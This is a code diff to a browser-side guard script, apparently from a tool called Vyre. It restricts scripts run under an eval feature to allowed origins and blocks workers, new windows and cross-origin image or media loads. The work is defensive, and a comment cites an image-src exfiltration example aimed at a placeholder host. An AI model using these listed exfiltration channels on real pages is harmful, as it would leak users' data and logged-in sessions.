@@ -99,7 +99,14 @@ export const guardInstall = `(() => {
   const blocked = [];
   // chrome.eval sets __vyreWrites: a script may read with the page's login but not write with it. A write goes through api.call, which is asked first.
   const writes = window.__vyreWrites === true;
-  const hold = (m, u, b) => { const c = classifySend(m, u, b); if (writes && !c.send && !/^(GET|HEAD|OPTIONS)$/i.test(String(m))) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: "write", write: true }); return true; } if (c.send) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: c.why }); return true; } return false; };
+  try { delete window.__vyreWrites; } catch (e) { window.__vyreWrites = undefined; }
+  // A second layer beside the browser-level guard: a script run under the guard may only reach origins it was given (this page's and what the page already talks to).
+  // Copied at install and removed from the page: a script that runs after this cannot add an origin to the list or null it.
+  const allow = Array.isArray(window.__vyreAllow) ? window.__vyreAllow.slice() : null;
+  try { delete window.__vyreAllow; } catch (e) { window.__vyreAllow = undefined; }
+  const outsider = u => { if (!allow) return ""; try { const x = new URL(String(u), location.href); if (!/^https?:$/.test(x.protocol)) return ""; return x.origin === location.origin || allow.includes(x.origin) ? "" : x.origin; } catch { return ""; } };
+  const hold = (m, u, b) => { const out = outsider(u); if (out) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: "the script tried to reach " + out + ", which is not this page or anything it already talks to" }); return true; } const c = classifySend(m, u, b); if (writes && !c.send && !/^(GET|HEAD|OPTIONS)$/i.test(String(m))) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: "write", write: true }); return true; } if (c.send) { blocked.push({ method: String(m).toUpperCase(), url: String(u), why: c.why }); return true; } return false; };
+  const restoreSrc = [];
   const of = window.fetch, xo = XMLHttpRequest.prototype.open, xs = XMLHttpRequest.prototype.send, sb = navigator.sendBeacon;
   window.fetch = function (i, o) {
     const m = (o && o.method) || (i && i.method) || "GET", u = (i && i.url) || i;
@@ -122,6 +129,23 @@ export const guardInstall = `(() => {
   if (writes) document.addEventListener("submit", onSubmit, true);
   // Channels the network layer does not always see: WebRTC (ICE resolves a hostname) and link hints that make the browser
   // resolve or connect (dns-prefetch, preconnect, prefetch). A cross-origin one made by the script is refused and reported.
+  // Under the eval guard (an allow list is present) a script may not start a Worker, SharedWorker or service worker (a worker has its own network and is not seen by this window's fetch),
+  // and may not open a window: each would be a way out that this shim and the frame-level guard do not watch.
+  if (allow) {
+    const refuseKind = what => { blocked.push({ method: what, url: what, why: "the script tried to start a " + what + ", which has its own network" }); throw new Error("Vyre held this"); };
+    for (const k of ["Worker", "SharedWorker"]) if (window[k]) window[k] = function () { refuseKind(k.toUpperCase()); };
+    try { if (navigator.serviceWorker && navigator.serviceWorker.register) navigator.serviceWorker.register = function () { refuseKind("SERVICEWORKER"); }; } catch (e) {}
+    if (window.open) window.open = function () { refuseKind("WINDOW.OPEN"); };
+    // An image or media element's src is a request too (new Image().src = "https://x/?d=..." is the oldest exfiltration there is). A cross-origin one is refused here.
+    for (const C of [window.HTMLImageElement, window.HTMLMediaElement]) {
+      try {
+        const d = C && Object.getOwnPropertyDescriptor(C.prototype, "src");
+        if (!d || !d.set) continue;
+        restoreSrc.push([C.prototype, d]);
+        Object.defineProperty(C.prototype, "src", { configurable: true, enumerable: d.enumerable, get: d.get, set(v) { if (hold("GET", v, "")) return; d.set.call(this, v); } });
+      } catch (e) {}
+    }
+  }
   const RTC = window.RTCPeerConnection, WRTC = window.webkitRTCPeerConnection;
   const refuse = (what, u) => { blocked.push({ method: what, url: String(u), why: "the script tried to open a channel to another site" }); };
   if (RTC) window.RTCPeerConnection = function () { refuse("WEBRTC", "webrtc"); throw new Error("Vyre held this"); };
@@ -140,7 +164,7 @@ export const guardInstall = `(() => {
   P.insertBefore = function (n) { if (hint(n)) { refuse("LINK", n.getAttribute("href")); return n; } return oi.apply(this, arguments); };
   E.append = function () { for (const n of arguments) if (hint(n)) { refuse("LINK", n.getAttribute("href")); return; } return oap.apply(this, arguments); };
   E.prepend = function () { for (const n of arguments) if (hint(n)) { refuse("LINK", n.getAttribute("href")); return; } return opp.apply(this, arguments); };
-  window.__vyreGuard = { blocked, restore() { if (WS) window.WebSocket = WS; if (RTC) window.RTCPeerConnection = RTC; if (WRTC) window.webkitRTCPeerConnection = WRTC; P.appendChild = oa; P.insertBefore = oi; E.append = oap; E.prepend = opp; window.fetch = of; XMLHttpRequest.prototype.open = xo; XMLHttpRequest.prototype.send = xs; if (sb) navigator.sendBeacon = sb; HTMLFormElement.prototype.submit = fs; if (frs) HTMLFormElement.prototype.requestSubmit = frs; document.removeEventListener("submit", onSubmit, true); } };
+  window.__vyreGuard = { blocked, restore() { if (WS) window.WebSocket = WS; if (RTC) window.RTCPeerConnection = RTC; if (WRTC) window.webkitRTCPeerConnection = WRTC; P.appendChild = oa; P.insertBefore = oi; E.append = oap; E.prepend = opp; window.fetch = of; for (const [pr, d] of restoreSrc) { try { Object.defineProperty(pr, "src", d); } catch (e) {} } XMLHttpRequest.prototype.open = xo; XMLHttpRequest.prototype.send = xs; if (sb) navigator.sendBeacon = sb; HTMLFormElement.prototype.submit = fs; if (frs) HTMLFormElement.prototype.requestSubmit = frs; document.removeEventListener("submit", onSubmit, true); } };
   return true;
 })()`;
 
